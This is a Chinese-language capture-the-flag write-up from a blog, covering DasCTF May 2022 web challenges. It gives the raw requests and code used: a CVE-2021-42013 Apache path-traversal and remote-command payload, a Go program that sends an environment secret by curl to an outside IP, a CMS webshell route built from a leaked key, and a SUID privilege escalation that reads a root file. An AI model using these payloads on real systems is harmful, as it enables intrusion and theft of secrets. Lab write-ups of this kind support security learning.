---
title: "DasCTF0522 Wp"
slug: "dasctf0522-wp"
description: "就摁水，"
date: 2022-05-22T17:25:29+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## Power Cookie

```
GET /check
cookie: admin=1
```

## 魔法浏览器

控制台给出需要用的UA头

```
GET /
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75
```

## getme

页面提示`pwd=/usr/local/apache2/`

尝试几个get参数，无

尝试配置文件/user/local/apache2/conf/httpd.conf，访问不到

注意到apache版本2.4.50 尝试[CVE-2021-42013](https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-42013/README.zh-cn.md)路径穿越

```
GET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/flag
```

是fake flag，那直接rce

```
POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh

echo;ls /diajgk/djflgak/qweqr/eigopl
```

得到flag的真实路径，再访问

```
GET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg
```

## hackme

/upload上传go源文件和编译好的elf文件

```go
package main

import (
        "fmt"
        "log"
        "os/exec"
        "os"
)

func main() {
        ttt := os.Getenv("FLAG")
        cmd := exec.Command("curl", "101.35.114.107:8426", "-d", string(ttt))
        out, err := cmd.CombinedOutput()
        if err != nil {
                fmt.Printf("combined out:\n%s\n", string(out))
                log.Fatalf("cmd.Run() failed with %s\n", err)
        }
        fmt.Printf("combined out:\n%s\n", string(out))
}
```

## fxxkgo

原题 go ssti+jwt伪造，[LineCTF 2022]gotm

## ezcms

定位到sys/apps/controllers/admin/Update.php，有经典的后台下载zip并解压的功能

![image-20220522171032396](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220522171032396.png)

注意到下载中间用到了`sys_auth`，有个全局`key=GKwHuLj9AOhaxJ2`

![image-20220522171256971](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220522171256971.png)

根据sys_auth生成对应的url，访问，蚁剑

## rootme

suid提权

```bash
find / -perm -4000 2>/dev/null
LFILE=/root/flag.txt
date -f $LFILE
```

## 问卷

好好好